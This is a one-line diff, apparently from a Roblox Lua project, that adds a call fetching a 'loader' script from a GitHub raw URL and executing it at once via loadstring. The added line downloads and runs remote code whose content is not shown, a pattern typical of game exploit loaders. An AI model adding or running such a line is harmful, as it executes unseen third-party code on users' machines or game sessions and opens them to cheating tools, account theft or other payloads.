@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sspecutils/utils/refs/heads/main/loader"))()
